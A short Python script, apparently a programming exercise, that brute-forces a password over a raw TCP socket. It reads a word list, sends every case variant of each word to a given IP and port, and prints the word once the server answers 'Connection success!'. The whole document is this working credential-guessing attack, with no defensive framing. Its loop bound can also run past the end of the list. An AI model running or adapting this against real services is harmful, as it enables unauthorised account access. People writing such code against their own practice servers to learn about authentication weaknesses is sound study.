import socket
import argparse
import itertools


filename = "passwords.txt"
psw_list = list(item.replace("\n", "") for item in open(filename))

# take argums from command line
argums = argparse.ArgumentParser("ip, port")
argums.add_argument("ip_address")
argums.add_argument("port")

str_arg = argums.parse_args()

psw_item = 0


def input_data_check(data):
    if data == b"Connection success!":
        return True
    elif data == b"Too many attempts":
        print("Too many attempts")
        return True
    return False


with socket.socket() as cli_socket:
    cli_socket.connect((str_arg.ip_address, int(str_arg.port)))

    while psw_item <= len(psw_list):
        for gen_psw in map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()]
                                                                   if letter.isalpha() else [letter]
                                                                   for letter in psw_list[psw_item]))):

            cli_socket.send("".join(gen_psw).encode())
            if input_data_check(cli_socket.recv(1024)):
                print(gen_psw)  # print found password
                psw_item = len(psw_list)+1  # stop the cycle
                break
        psw_item += 1
